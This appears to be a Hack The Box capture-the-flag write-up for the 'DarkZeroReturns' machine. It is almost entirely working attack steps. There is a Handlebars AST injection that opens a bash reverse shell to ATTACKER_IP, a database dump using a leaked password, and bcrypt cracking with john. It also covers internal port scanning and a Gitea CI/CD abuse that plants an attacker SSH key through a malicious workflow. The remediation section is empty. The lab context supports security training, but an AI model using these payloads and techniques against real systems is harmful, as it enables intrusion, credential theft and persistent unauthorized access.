
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">DarkZeroReturns Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb32a5-8e1c-4d62-bf6e-d2041d6448ad-1781002585.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): 0xEr3bus & Pho3o</p>
    <p style="margin: 0;">Difficulty: Hard</p>
    <p style="margin: 0;">Date: 29 Jul 2026</p>
  </div>

</div>

<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.

## Full Port Scan

```shell
nmap -p- --min-rate 5000 -Pn 10.129.46.72
```

## Targeted Scan

```shell
nmap -A -p 22,80 10.129.46.72    
```

## Add vhost to hosts file

```bash
echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Web exploitation (Handlebars AST → RCE)

### Register + Log in

Then at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.

### Reverse shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Then at `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:

> ⚠ Two swaps in this block: `ATTACKER_IP` → your tun0 IP (in the `cmd` line), and `15` → your character ID (in the fetch URL).

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
const b64 = btoa(cmd);
const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;
const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: { type: "PathExpression", data: false, depth: 0, parts: ["lookup"], original: "lookup", loc: L },
    params: [
      { type: "PathExpression", data: false, depth: 0, parts: [], original: "this", loc: L },
      { type: "NumberLiteral", value: payload, original: 1, loc: L }
    ],
    escaped: true, strip: { open: false, close: false }, loc: L
  }],
  strip: {}, loc: L
};
const r = await fetch("/character/15", {
  method: "POST", credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue", backstory: "test", campaign_message: ast })
});
console.log(r.status);
```

### Stabilize the reverse shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ctrl + Z, then on Kali:

```bash
stty raw -echo; fg
```

Enter, then in the shell:

```bash
export TERM=xterm
stty rows 50 columns 200
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Foothold enumeration → SSH as josh

### Read app config

```bash
ls -la /opt/
cat /opt/DarkZero_Campaigns/.env
```

### Dump users table

```bash
mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
```

### Crack josh 

> ⚠ Use your hash from the users table:

```bash
echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
```

### SSH in

```bash
ssh josh@TARGET_IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Internal recon (as josh on SRV01)

### Local services

```bash
ss -tlnp
```

### Map internal net

```bash
for i in 1 2 3 4 5 10 20 100; do (ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
cat /etc/resolv.conf
ip route
```

### Port-scan the DC

```bash
for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait
```

### Fingerprint Gitea

```bash
curl -s -I http://172.16.20.2:3000/
curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Gitea via Kerberos → CI/CD → user

### Confirm inherited TGT

```bash
klist
```

### Verify service ticket

```bash
getent hosts gitea.darkzero.ext
kvno HTTP/gitea.darkzero.ext
```

### SSPI login

```bash
curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
cat /tmp/gitea_cookies.txt
```

### Identity + repos

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
```

### Repo perms + workflow dir

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('has_actions:', d.get('has_actions'))"

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
  | python3 -m json.tool
```

### Read workflow

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
```

### Fork 

> ⚠ NOTE: keep `CSRF=...` on its OWN line. A trailing backslash here merges it into curl and sends an empty token (the fork silently fails).

```bash
CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
```

Expect `perms: {'admin': True, 'push': True, 'pull': True}`.

### Generate SSH key

```bash
ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
cat /tmp/.runner_key.pub
```

### Write payload workflow 

> ⚠ paste YOUR pubkey from above into the echo line:

```bash
cat > /tmp/foothold.yml << 'EOF'
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'PASTE_YOUR_PUBKEY_HERE' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
EOF
cat /tmp/foothold.yml
```

### Upload to fork

```bash
B64=$(base64 -w0 /tmp/foothold.yml)

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name','')); print('msg:', d.get('message',''))"
```

### Open PR

```bash
PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"CI","body":"update","head":"darkzero-ext_josh:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

PRNUM=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['number'])")
SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head']['sha'])")
echo "PR=$PRNUM SHA=$SHA"
```

**3.24 — trigger + collect flag**

bash

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\",\"body\":\"go\",\"commit_id\":\"$SHA\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PRNUM/reviews" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('state:', d.get('state'))"

sleep 15

ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
```

---
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

